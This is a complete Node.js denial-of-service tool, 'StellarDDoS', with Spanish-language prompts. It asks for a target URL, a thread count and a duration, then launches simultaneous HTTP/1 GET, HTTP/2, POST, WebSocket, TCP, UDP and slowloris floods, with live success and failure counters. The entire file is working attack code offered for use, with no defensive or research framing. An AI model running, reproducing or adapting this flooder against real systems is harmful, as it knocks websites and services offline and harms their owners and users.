#!/usr/bin/env node
'use strict';

const net = require('net');
const dgram = require('dgram');
const http = require('http');
const https = require('https');
const http2 = require('http2');
const WebSocket = require('ws');
const { performance } = require('perf_hooks');
const readline = require('readline');
const chalk = require('chalk');

class StellarDDoS {
    constructor() {
        this.stats = { total: 0, success: 0, failed: 0, startTime: 0 };
        this.running = false;
        this.animationChars = ['|', '/', '-', '\\'];
        this.animationIndex = 0;
    }

    startAttack(target, options = {}) {
        if (this.running) {
            console.log(chalk.red('Ataque ya en ejecución'));
            return;
        }
        const threads = options.threads || 200;
        const duration = options.duration || 30;
        const url = new URL(target);
        const protocol = target.startsWith('https') ? https : http;

        this.running = true;
        this.stats.startTime = performance.now();
        this.agent = new protocol.Agent({ keepAlive: true, maxSockets: threads * 500 });
        this.udpSocket = dgram.createSocket('udp4').on('error', () => {});

        this.showInterval = setInterval(() => this.showStats(), 100);
        this.animInterval = setInterval(() => this.updateAnimation(), 100);

        for (let i = 0; i < threads; i++) {
            this.floodHTTP1(url, protocol);
            this.floodHTTP2(url);
            this.floodHTTPPost(url, protocol);
            this.floodWebSocket(url);
            this.tcpFlood(url);
            this.udpFlood(url);
            this.slowloris(url);
        }

        setTimeout(() => this.stop(), duration * 1000);
    }

    updateAnimation() {
        this.animationIndex = (this.animationIndex + 1) % this.animationChars.length;
    }

    showStats() {
        const elapsed = ((performance.now() - this.stats.startTime) / 1000).toFixed(2);
        const char = this.animationChars[this.animationIndex];
        process.stdout.write(
            `\r\x1b[2K${chalk.greenBright(char)} ${elapsed}s | Total: ${this.stats.total} | ` +
            `${chalk.green(this.stats.success)} | ${chalk.red(this.stats.failed)}`
        );
    }

    floodHTTP1(url, protocol) {
        if (!this.running) return;
        const req = protocol.request({
            hostname: url.hostname,
            port: url.port || (url.protocol === 'https:' ? 443 : 80),
            path: url.pathname + '?' + Math.random().toString(36).slice(2),
            method: 'GET',
            headers: { 'User-Agent': 'Mozilla/5.0', Connection: 'keep-alive' },
            agent: this.agent
        }, res => {
            res.on('data', () => {});
            res.on('end', () => {
                this.onSuccess();
                setImmediate(() => this.floodHTTP1(url, protocol));
            });
        });
        req.on('error', () => {
            this.onFail();
            setImmediate(() => this.floodHTTP1(url, protocol));
        });
        for (let j = 0; j < 50; j++) {
            req.write(
                `GET ${url.pathname}?${Math.random().toString(36).slice(2)} HTTP/1.1\r\n` +
                `Host: ${url.hostname}\r\n` +
                `Connection: keep-alive\r\n\r\n`
            );
        }
        req.setTimeout(1000, () => req.destroy());
        req.end();
    }

    floodHTTP2(url) {
        if (!this.running) return;
        const client = http2.connect(url.origin);
        client.on('error', () => client.close());
        const req = client.request({
            ':path': url.pathname + '?' + Math.random().toString(36).slice(2),
            ':method': 'GET'
        });
        req.on('data', () => {});
        req.on('end', () => {
            this.onSuccess();
            setImmediate(() => this.floodHTTP2(url));
            req.close();
            client.close();
        });
        req.end();
    }

    floodHTTPPost(url, protocol) {
        if (!this.running) return;
        const req = protocol.request({
            hostname: url.hostname,
            port: url.port || (url.protocol === 'https:' ? 443 : 80),
            path: url.pathname + '?' + Math.random().toString(36).slice(2),
            method: 'POST',
            headers: { 'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/x-www-form-urlencoded', Connection: 'keep-alive' },
            agent: this.agent
        }, res => {
            res.on('data', () => {});
            res.on('end', () => {
                this.onSuccess();
                setImmediate(() => this.floodHTTPPost(url, protocol));
            });
        });
        req.on('error', () => {
            this.onFail();
            setImmediate(() => this.floodHTTPPost(url, protocol));
        });
        req.write(`data=${Math.random().toString(36).slice(2)}`);
        req.end();
    }

    floodWebSocket(url) {
        if (!this.running) return;
        const ws = new WebSocket(url.origin.replace(/^http/, 'ws'));
        ws.on('open', () => {
            ws.send('X'.repeat(2048), err => err ? this.onFail() : this.onSuccess());
            setImmediate(() => this.floodWebSocket(url));
        });
        ws.on('error', () => {
            this.onFail();
            setImmediate(() => this.floodWebSocket(url));
        });
    }

    tcpFlood(url) {
        if (!this.running) return;
        const sock = net.connect({ host: url.hostname, port: url.port || 80 }, () => {
            this.onSuccess();
            sock.destroy();
            setImmediate(() => this.tcpFlood(url));
        });
        sock.on('error', () => {
            this.onFail();
            setImmediate(() => this.tcpFlood(url));
        });
    }

    udpFlood(url) {
        if (!this.running) return;
        const msg = Buffer.alloc(4096);
        this.udpSocket.send(msg, url.port || 80, url.hostname, err => {
            err ? this.onFail() : this.onSuccess();
            setImmediate(() => this.udpFlood(url));
        });
    }

    slowloris(url) {
        if (!this.running) return;
        const port = url.port || (url.protocol === 'https:' ? 443 : 80);
        const sock = net.connect(port, url.hostname, () => {
            sock.write(`POST ${url.pathname} HTTP/1.1\r\nHost: ${url.hostname}\r\n`);
            sock.write('User-Agent: Mozilla/5.0\r\n');
            const iv = setInterval(() => {
                if (!this.running) { clearInterval(iv); sock.destroy(); return; }
                sock.write(`X-a: ${Math.random()}\r\n`);
            }, 1000);
        });
        sock.on('error', () => this.onFail());
    }

    onSuccess() {
        this.stats.success++;
        this.stats.total++;
    }

    onFail() {
        this.stats.failed++;
        this.stats.total++;
    }

    stop() {
        if (!this.running) return;
        clearInterval(this.showInterval);
        clearInterval(this.animInterval);
        this.udpSocket.close();
        const elapsed = ((performance.now() - this.stats.startTime) / 1000).toFixed(2);
        console.log(chalk.green(`\nAtaque finalizado en ${elapsed}s`));
        console.log(chalk.blue(`Total de peticiones: ${this.stats.total}`));
        console.log(chalk.green(`Éxitos: ${this.stats.success}`) + ' | ' + chalk.red(`Fallidos: ${this.stats.failed}`));
        console.log();
        process.exit(0);
    }
}

const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
const stellar = new StellarDDoS();
rl.question(chalk.greenBright('URL objetivo: '), target => {
    rl.question(chalk.greenBright('Número de hilos (200): '), threads => {
        rl.question(chalk.greenBright('Duración (30s): '), duration => {
            stellar.startAttack(target, { threads: parseInt(threads) || 200, duration: parseInt(duration) || 30 });
            rl.on('line', line => { if (line.trim() === 'stop') { stellar.stop(); rl.close(); } });
        });
    });
});
rl.on('close', () => stellar.stop());
